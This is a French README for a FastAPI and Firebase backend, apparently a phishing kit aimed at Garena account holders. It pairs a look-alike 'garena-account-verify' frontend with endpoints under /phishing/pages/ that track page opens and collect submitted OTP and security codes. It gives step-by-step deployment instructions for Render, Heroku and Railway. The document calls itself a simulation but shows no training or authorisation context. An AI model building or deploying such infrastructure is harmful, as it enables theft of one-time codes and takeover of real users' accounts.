# Garena Backend — FastAPI Cloud Server

Backend FastAPI pour la simulation de vérification de compte Garena.  
**Frontend hébergé sur :** https://garena-account-verify.vercel.app

---

## 📁 Structure

```
garena-backend/
├── main.py                      # Serveur FastAPI principal
├── config.py                    # Configuration Firebase (env vars)
├── auth.py                      # Auth Pyrebase
├── firebase/
│   ├── __init__.py
│   ├── firebase.py              # Initialisation Firestore Admin SDK
│   └── serviceAccount.json      # Clé service account (à ajouter manuellement)
├── templates/
│   └── phishing.html            # Template HTML (fallback si besoin)
├── logs/                        # Logs auto-générés
├── .env.example                 # Exemple de variables d'environnement
├── requirements.txt
├── Procfile                     # Commande de démarrage (Render/Heroku)
├── start.sh                     # Script de démarrage manuel
├── runtime.txt
└── README.md
```

---

## 🚀 Déploiement Rapide

### ⚠️ IMPORTANT — Commande de démarrage

**NE PAS utiliser** `fastapi run` ou `fastapi dev` en production/cloud.

**Utiliser impérativement :**
```bash
# Production (recommandé)
gunicorn -w 2 -k uvicorn.workers.UvicornWorker main:app

# Ou uvicorn direct
uvicorn main:app --host 0.0.0.0 --port 8000
```

### 1. Préparer les secrets

**NE JAMAIS COMMITER les fichiers secrets.**

- Copie `.env.example` → `.env` et remplis tes vraies valeurs Firebase.
- Copie `firebase/serviceAccount.json.example` → `firebase/serviceAccount.json` et colle ta vraie clé service account.

### 2. Déploiement Render.com (Recommandé)

1. **Push ce projet sur GitHub** (sans `.env` ni `serviceAccount.json` — ajoute-les aux secrets Render).
2. **Crée un Web Service** sur [render.com](https://render.com).
3. **Build Command :**
   ```bash
   pip install -r requirements.txt
   ```
4. **Start Command :**
   ```bash
   gunicorn -w 2 -k uvicorn.workers.UvicornWorker main:app
   ```
   > Render injecte automatiquement la variable `PORT`.
5. **Environment Variables :** Ajoute toutes les variables de `.env` dans l'onglet **Environment** de Render.
6. **Secret File :** Ajoute le contenu de `serviceAccount.json` dans un secret file ou colle-le via le dashboard.

### 3. Déploiement Railway / Heroku / Koyeb

Même principe :
- `requirements.txt` est auto-détecté.
- Définis la commande de démarrage : `gunicorn -w 2 -k uvicorn.workers.UvicornWorker main:app`
- Ajoute les variables d'environnement.
- Pour `serviceAccount.json`, utilise soit :
  - Un volume persistant
  - Une variable d'environnement `FIREBASE_SERVICE_ACCOUNT_PATH` pointant vers un chemin monté
  - Ou encode le JSON en base64 et décode-le au runtime

---

## 🔗 Endpoints API

| Méthode | Path | Description |
|---------|------|-------------|
| GET | `/{uid}/otp?garena={token}` | Sert la page HTML (fallback) |
| POST | `/phishing/pages/track-open` | Track l'ouverture de page |
| POST | `/phishing/pages/submit-otp` | Soumet OTP / Security Code |
| POST | `/phishing/pages/verify-status` | Vérifie le statut serveur |
| POST | `/phishing/pages/resend` | Demande un renvoi de code |
| POST | `/phishing/pages/reset-verification` | Reset un champ de vérif |
| GET | `/health` | Health check |

---

## 🔒 Sécurité

- Rate limiting in-memory par IP / page
- Sanitisation des inputs (regex + length limits)
- Hash SHA-256 des session tokens
- Headers de sécurité (CSP, X-Frame-Options, etc.)
- Logs structurés sans données sensibles
- CORS restreint au frontend Vercel par défaut

---

## ⚙️ Variables d'Environnement

| Variable | Description | Défaut |
|----------|-------------|--------|
| `FIREBASE_API_KEY` | Clé API Firebase | — |
| `FIREBASE_AUTH_DOMAIN` | Auth domain | — |
| `FIREBASE_PROJECT_ID` | Project ID | — |
| `FIREBASE_DATABASE_URL` | Realtime DB URL | — |
| `FIREBASE_STORAGE_BUCKET` | Storage bucket | — |
| `FIREBASE_MESSAGING_SENDER_ID` | Sender ID | — |
| `FIREBASE_APP_ID` | App ID | — |
| `CORS_ALLOWED_ORIGINS` | Origines CORS autorisées | `https://garena-account-verify.vercel.app` |
| `PORT` | Port d'écoute | `8000` |
| `FIREBASE_SERVICE_ACCOUNT_PATH` | Chemin vers serviceAccount.json | `firebase/serviceAccount.json` |

---

## 🧪 Test Local

```bash
# 1. Créer l'environnement
python -m venv venv
source venv/bin/activate  # Windows: venv\Scripts\activate

# 2. Installer
pip install -r requirements.txt

# 3. Configurer
# Copie .env.example → .env et remplis
# Copie serviceAccount.json.example → firebase/serviceAccount.json et remplis

# 4. Lancer (NE PAS utiliser "fastapi run")
python main.py
# ou
uvicorn main:app --reload --port 8000
```

---

## 📝 Notes

- Le CORS est déjà configuré pour accepter `https://garena-account-verify.vercel.app`.
- Si tu changes de domaine frontend, modifie `CORS_ALLOWED_ORIGINS`.
- Le template `phishing.html` est servi en fallback si un utilisateur accède directement au backend.
- Pour le cloud, préfère `gunicorn` avec workers Uvicorn en production.
- **Ne jamais** utiliser `fastapi run` ou `fastapi dev` en production — utiliser `gunicorn` ou `uvicorn`.
